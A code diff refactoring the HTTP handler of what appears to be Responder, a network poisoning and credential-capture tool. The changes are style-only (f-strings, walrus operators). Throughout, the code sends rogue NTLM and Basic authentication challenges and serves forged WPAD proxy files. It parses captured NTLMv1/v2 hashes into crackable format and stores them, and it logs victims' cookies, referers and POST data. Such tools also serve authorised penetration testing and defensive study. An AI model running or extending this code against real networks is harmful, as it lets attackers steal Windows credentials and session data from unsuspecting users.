@@ -31,7 +31,7 @@ def ParseHTTPHash(data, Challenge, client, module):
     LMhashOffset = struct.unpack('<H',data[16:18])[0]
     LMHash       = data[LMhashOffset:LMhashOffset+LMhashLen]
     LMHashFinal  = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
-    
+
     NthashLen    = struct.unpack('<H',data[20:22])[0]
     NthashOffset = struct.unpack('<H',data[24:26])[0]
     NTHash       = data[NthashOffset:NthashOffset+NthashLen]
@@ -44,16 +44,18 @@ def ParseHTTPHash(data, Challenge, client, module):
         HostNameLen     = struct.unpack('<H',data[46:48])[0]
         HostNameOffset  = struct.unpack('<H',data[48:50])[0]
         HostName        = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
-        WriteHash       = '%s::%s:%s:%s:%s' % (User, HostName, LMHashFinal, NTHashFinal, Challenge1)
-        SaveToDb({
-            'module': module, 
-            'type': 'NTLMv1', 
-            'client': client, 
-            'host': HostName, 
-            'user': User, 
-            'hash': LMHashFinal+':'+NTHashFinal, 
-            'fullhash': WriteHash,
-        })
+        WriteHash = f'{User}::{HostName}:{LMHashFinal}:{NTHashFinal}:{Challenge1}'
+        SaveToDb(
+            {
+                'module': module,
+                'type': 'NTLMv1',
+                'client': client,
+                'host': HostName,
+                'user': User,
+                'hash': f'{LMHashFinal}:{NTHashFinal}',
+                'fullhash': WriteHash,
+            }
+        )
 
     if NthashLen > 24:
         NthashLen      = 64
@@ -63,48 +65,43 @@ def ParseHTTPHash(data, Challenge, client, module):
         HostNameLen    = struct.unpack('<H',data[44:46])[0]
         HostNameOffset = struct.unpack('<H',data[48:50])[0]
         HostName       = data[HostNameOffset:HostNameOffset+HostNameLen].decode('latin-1').replace('\x00','')
-        WriteHash      = '%s::%s:%s:%s:%s' % (User, Domain, Challenge1, NTHashFinal[:32], NTHashFinal[32:])
-        SaveToDb({
-            'module': module, 
-            'type': 'NTLMv2', 
-            'client': client, 
-            'host': HostName, 
-            'user': Domain + '\\' + User,
-            'hash': NTHashFinal[:32] + ':' + NTHashFinal[32:],
-            'fullhash': WriteHash,
-        })
+        WriteHash = f'{User}::{Domain}:{Challenge1}:{NTHashFinal[:32]}:{NTHashFinal[32:]}'
+        SaveToDb(
+            {
+                'module': module,
+                'type': 'NTLMv2',
+                'client': client,
+                'host': HostName,
+                'user': Domain + '\\' + User,
+                'hash': f'{NTHashFinal[:32]}:{NTHashFinal[32:]}',
+                'fullhash': WriteHash,
+            }
+        )
 
 def GrabCookie(data, host):
-    Cookie = re.search(r'(Cookie:*.\=*)[^\r\n]*', data)
-
-    if Cookie:
+    if Cookie := re.search(r'(Cookie:*.\=*)[^\r\n]*', data):
         Cookie = Cookie.group(0).replace('Cookie: ', '')
         if len(Cookie) > 1 and settings.Config.Verbose:
-            print(text("[HTTP] Cookie           : %s " % Cookie))
+            print(text(f"[HTTP] Cookie           : {Cookie} "))
         return Cookie
     return False
 
 def GrabReferer(data, host):
-    Referer = re.search(r'(Referer:*.\=*)[^\r\n]*', data)
-
-    if Referer:
+    if Referer := re.search(r'(Referer:*.\=*)[^\r\n]*', data):
         Referer = Referer.group(0).replace('Referer: ', '')
         if settings.Config.Verbose:
-            print(text("[HTTP] Referer         : %s " % color(Referer, 3)))
+            print(text(f"[HTTP] Referer         : {color(Referer, 3)} "))
         return Referer
     return False
 
 def SpotFirefox(data):
-    UserAgent = re.findall(r'(?<=User-Agent: )[^\r]*', data)
-    if UserAgent:
-        print(text("[HTTP] %s" % color("User-Agent        : "+UserAgent[0], 2)))
-        IsFirefox = re.search('Firefox', UserAgent[0])
-        if IsFirefox:
-            print(color("[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.", 1))
-            print(color("[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)", 1))
-            return True
-        else:
+    if UserAgent := re.findall(r'(?<=User-Agent: )[^\r]*', data):
+        print(text(f'[HTTP] {color(f"User-Agent        : {UserAgent[0]}", 2)}'))
+        if not (IsFirefox := re.search('Firefox', UserAgent[0])):
             return False
+        print(color("[WARNING]: Mozilla doesn't switch to fail-over proxies (as it should) when one's failing.", 1))
+        print(color("[WARNING]: The current WPAD script will cause disruption on this host. Sending a dummy wpad script (DIRECT connect)", 1))
+        return True
 
 def WpadCustom(data, client):
     Wpad = re.search(r'(/wpad.dat|/*\.pac)', data)
@@ -120,15 +117,10 @@ def WpadCustom(data, client):
     return False
 
 def IsWebDAV(data):
-        dav = re.search('PROPFIND', data)
-        if dav:
-              return True
-        else:
-              return False
+    return bool(dav := re.search('PROPFIND', data))
 
 def ServeOPTIONS(data):
-    WebDav= re.search('OPTIONS', data)
-    if WebDav:
+    if WebDav := re.search('OPTIONS', data):
         Buffer = WEBDAV_Options_Answer()
         return str(Buffer)
 
@@ -145,7 +137,7 @@ def RespondWithFile(client, filename, dlname=None):
         Buffer = ServeHtmlFile(Payload = ServeFile(filename))
 
     Buffer.calculate()
-    print(text("[HTTP] Sending file %s to %s" % (filename, client)))
+    print(text(f"[HTTP] Sending file {filename} to {client}"))
     return str(Buffer)
 
 def GrabURL(data, host):
@@ -160,7 +152,7 @@ def GrabURL(data, host):
         print(text("[HTTP] POST request from: %-15s  URL: %s" % (host, color(''.join(POST), 5))))
 
         if len(''.join(POSTDATA)) > 2:
-            print(text("[HTTP] POST Data: %s" % ''.join(POSTDATA).strip()))
+            print(text(f"[HTTP] POST Data: {''.join(POSTDATA).strip()}"))
 
 # Handle HTTP packet sequence.
 def PacketSequence(data, client, Challenge):
@@ -176,7 +168,6 @@ def PacketSequence(data, client, Challenge):
         return RespondWithFile(client, settings.Config.Html_Filename)
 
     WPAD_Custom = WpadCustom(data, client)
-        # Webdav
     if ServeOPTIONS(data):
         return ServeOPTIONS(data)
 
@@ -190,20 +181,18 @@ def PacketSequence(data, client, Challenge):
             Buffer = NTLM_Challenge(ServerChallenge=NetworkRecvBufferPython2or3(Challenge))
             Buffer.calculate()
 
-            Buffer_Ans = IIS_NTLM_Challenge_Ans(Payload = b64encode(NetworkSendBufferPython2or3(Buffer)).decode('latin-1'))
-            #Buffer_Ans.calculate(Buffer)
-            return Buffer_Ans
-
+            return IIS_NTLM_Challenge_Ans(
+                Payload=b64encode(NetworkSendBufferPython2or3(Buffer)).decode(
+                    'latin-1'
+                )
+            )
         if Packet_NTLM == b'\x03':
             NTLM_Auth = b64decode(''.join(NTLM_Auth))
-            if IsWebDAV(data):
-                module = "WebDAV"
-            else:
-                module = "HTTP"
+            module = "WebDAV" if IsWebDAV(data) else "HTTP"
             ParseHTTPHash(NTLM_Auth, Challenge, client, module)
 
             if settings.Config.Force_WPAD_Auth and WPAD_Custom:
-                print(text("[HTTP] WPAD (auth) file sent to %s" % client.replace("::ffff:","")))
+                print(text(f'[HTTP] WPAD (auth) file sent to {client.replace("::ffff:", "")}'))
 
                 return WPAD_Custom
             else:
@@ -228,7 +217,7 @@ def PacketSequence(data, client, Challenge):
 
         if settings.Config.Force_WPAD_Auth and WPAD_Custom:
             if settings.Config.Verbose:
-                print(text("[HTTP] WPAD (auth) file sent to %s" % client.replace("::ffff:","")))
+                print(text(f'[HTTP] WPAD (auth) file sent to {client.replace("::ffff:", "")}'))
 
             return WPAD_Custom
         else:
@@ -239,12 +228,20 @@ def PacketSequence(data, client, Challenge):
         if settings.Config.Basic:
             Response = IIS_Basic_401_Ans()
             if settings.Config.Verbose:
-                print(text("[HTTP] Sending BASIC authentication request to %s" % client.replace("::ffff:","")))
+                print(
+                    text(
+                        f'[HTTP] Sending BASIC authentication request to {client.replace("::ffff:", "")}'
+                    )
+                )
 
         else:
             Response = IIS_Auth_401_Ans()
             if settings.Config.Verbose:
-                print(text("[HTTP] Sending NTLM authentication request to %s" % client.replace("::ffff:","")))
+                print(
+                    text(
+                        f'[HTTP] Sending NTLM authentication request to {client.replace("::ffff:", "")}'
+                    )
+                )
 
         return Response
 
@@ -267,16 +264,14 @@ class HTTP(BaseRequestHandler):
                     remaining -= len(buff)
                     #check if we recieved the full header
                     if data.find('\r\n\r\n') != -1: 
-                        #we did, now to check if there was anything else in the request besides the header
                         if data.find('Content-Length') == -1:
                             #request contains only header
                             break
-                        else:
-                            #searching for that content-length field in the header
-                            for line in data.split('\r\n'):
-                                if line.find('Content-Length') != -1:
-                                    line = line.strip()
-                                    remaining = int(line.split(':')[1].strip()) - len(data)
+                        #searching for that content-length field in the header
+                        for line in data.split('\r\n'):
+                            if line.find('Content-Length') != -1:
+                                line = line.strip()
+                                remaining = int(line.split(':')[1].strip()) - len(data)
                     if remaining <= 0:
                         break
                 if data == "":
@@ -288,13 +283,17 @@ class HTTP(BaseRequestHandler):
                     self.request.send(NetworkSendBufferPython2or3(Buffer))
                     self.request.close()
                     if settings.Config.Verbose:
-                        print(text("[HTTP] WPAD (no auth) file sent to %s" % self.client_address[0].replace("::ffff:","")))
+                        print(
+                            text(
+                                f'[HTTP] WPAD (no auth) file sent to {self.client_address[0].replace("::ffff:", "")}'
+                            )
+                        )
 
                 else:
                     Buffer = PacketSequence(data,self.client_address[0], Challenge)
                     self.request.send(NetworkSendBufferPython2or3(Buffer))
-        
-        except:
+
+        except Exception:
             pass
             
 
